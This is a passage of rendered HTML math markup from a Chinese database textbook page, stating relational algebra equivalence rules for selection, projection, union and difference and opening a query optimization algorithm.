class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">))</span></span></span></span></span></eqn></section></p><h5 id="%E5%AE%9A%E7%90%86l8%3A%E9%80%89%E6%8B%A9%E5%92%8C%E5%B9%B6%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L8:选择和并的交换律</h5><p>设关系代数表达式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E=E_1\cup E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>是条件，则有：<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>∪</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F}(E_1\cup E_2)\equiv \sigma_F(E_1) \cup \sigma_F(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></p><h5 id="%E5%AE%9A%E7%90%86l9%3A%E9%80%89%E6%8B%A9%E5%92%8C%E5%B7%AE%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L9:选择和差的交换律</h5><p>设关系代数表达式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><msub><mi>E</mi><mn>1</mn></msub><mo>−</mo><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E=E_1-E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>，<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi></mrow><annotation encoding="application/x-tex">F</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span></span></span></span></eq>是条件，则有：<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>−</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>σ</mi><mi>F</mi></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\sigma_{F}(E_1 - E_2)\equiv \sigma_F(E_1) - \sigma_F(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></p><h5 id="%E5%AE%9A%E7%90%86l10%3A%E6%8A%95%E5%BD%B1%E5%92%8C%E5%B9%B6%E7%9A%84%E4%BA%A4%E6%8D%A2%E5%BE%8B" tabindex="-1">定理L10:投影和并的交换律</h5><p>设关系代数表达式<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow><annotation encoding="application/x-tex">E=E_1\cup E_2,A_1...A_n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">...</span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span></span></span></span></eq>中的一些属性，则有<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>1</mn></msub><mo>∪</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>≡</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo>∪</mo><msub><mi>π</mi><mrow><msub><mi>A</mi><mn>1</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>A</mi><mi>n</mi></msub></mrow></msub><mo stretchy="false">(</mo><msub><mi>E</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi_{A_1..A_n}(E_1\cup E_2)\equiv \pi_{A_1..A_n}\cup \pi_{A_1..A_n}(E_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8057em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.0001em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight">..</span><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1645em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2501em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></eqn></section></p><h3 id="2105-%E5%9F%BA%E4%BA%8E%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0%E7%9A%84%E6%9F%A5%E8%AF%A2%E4%BC%98%E5%8C%96%E7%AE%97%E6%B3%95%E5%8F%8A%E7%A4%BA%E4%BE%8B" tabindex="-1">2105 基于关系代数的查询优化算法及示例</h3><ul><li>算法：关系代数表达式的优化算法</li><li>input：一个关系代数表达式的语法树</li><li>output：计算该表达式的程序</li><li>method：<ul><li>依据定理L4,把形如<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><msub><mi>F</mi><mn>1</mn></msub><mo>∧</mo><msub><mi>F</mi><mn>2</mn></msub><mo>∧</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>∧</mo><msub><mi>F</mi><mi>n</mi></msub></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F_1\wedge F_2\wedge ...\wedge F_n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6807em;vertical-align:-0.2501em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∧</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:-0.1389em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">∧</span><span class="mord mtight">...</span><span class="mbin mtight">∧</span><span class="mord mtight"><span class="mord mathnormal mtight" 